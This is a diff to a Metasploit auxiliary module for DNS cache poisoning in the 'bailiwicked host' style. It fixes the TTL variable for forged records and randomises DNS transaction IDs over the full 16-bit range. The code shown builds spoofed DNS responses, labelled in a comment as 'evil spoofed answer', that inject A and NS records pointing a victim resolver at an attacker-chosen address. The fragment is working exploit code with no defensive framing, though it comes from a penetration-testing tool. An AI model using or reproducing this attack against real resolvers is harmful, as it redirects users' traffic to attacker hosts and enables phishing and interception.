@@ -131,8 +131,8 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		address  = datastore['NEWADDR']
 		recons   = datastore['RECONS']
 		xids     = datastore['XIDS'].to_i
-		ttl      = datastore['TTL'].to_i
-		xidbase  = rand(4)+2*10000
+		newttl   = datastore['TTL'].to_i
+		xidbase  = rand(65536)
 
 		domain = hostname.match(/[^\x2e]+\x2e[^\x2e]+\x2e$/)[0]
 
@@ -189,6 +189,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 							sleep ttl
 						end
 					end
+					
 				end
 			end until not cached
 		rescue ::Interrupt
@@ -267,9 +268,9 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			queries += 1
 			
 			# Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
-			req.add_answer(randhost, ttl, Resolv::DNS::Resource::IN::A.new(address))
-			req.add_authority(domain, ttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(hostname)))
-			req.add_additional(hostname, ttl, Resolv::DNS::Resource::IN::A.new(address))
+			req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))
+			req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(hostname)))
+			req.add_additional(hostname, newttl, Resolv::DNS::Resource::IN::A.new(address))
 			req.qr = 1
 			req.ra = 1
 
